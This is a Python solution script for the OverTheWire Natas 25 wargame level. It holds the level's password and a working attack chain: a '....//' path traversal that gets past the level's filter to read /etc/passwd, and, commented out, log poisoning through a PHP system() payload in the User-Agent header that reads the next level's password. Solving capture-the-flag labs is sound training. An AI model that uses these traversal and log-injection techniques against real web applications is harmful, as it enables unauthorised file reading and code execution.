import requests
import re


user = 'natas25'
passw = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'
url = 'http://%s.natas.labs.overthewire.org/' % user


session = requests.Session()

# # 1st step:  print the sourcecode
# #'''
# response = session.get(url, auth=(user, passw))
# print(response.text)
# print(response.cookies)
# #'''
# # Seems like another PHP vulnerability exercise



# # 2nd step: checking the sourcecode
# #'''
# import html
# response = session.get(url + 'index-source.html', auth=(user, passw))
# print(html.unescape(response.content.decode('utf8').replace('\r', '\n')))
# #'''


# 3rd step: try to reach some other files in the system (lfi)
#'''
response = session.post(url, auth=(user, passw), data={'lang':'....//....//....//....//....//etc/passwd'})
print(response.text)
#'''

# # 4th step: 
# #'''
# # creating the request that will be logged
# fake_header = {"User-Agent" : "<?php system('cat /etc/natas_webpass/natas26'); ?>"}
# response = session.post(url, auth=(user, passw), headers=fake_header, data={'lang':'....//....//....//....//....//etc/passwd'})  # this might not be needed, but just to be safe
# response2 = session.post(url, auth=(user, passw), headers=fake_header, data={'lang':'....//....//....//....//....//var/www/natas/natas25/logs/natas25_' + response.cookies["PHPSESSID"] + '.log'})
# print(response2.text)

# # print("Here is the result:")
# # matchObject = re.search('((?!%s)[a-zA-Z0-9]{32})' % passw, response2.text)  # we know that the password has length of 32 chars and consisting of alphanum
# # # the first part of the regular expression is for not to match with our previous password, since it's also present in the sourcecode
# # print(matchObject.group())
# # #'''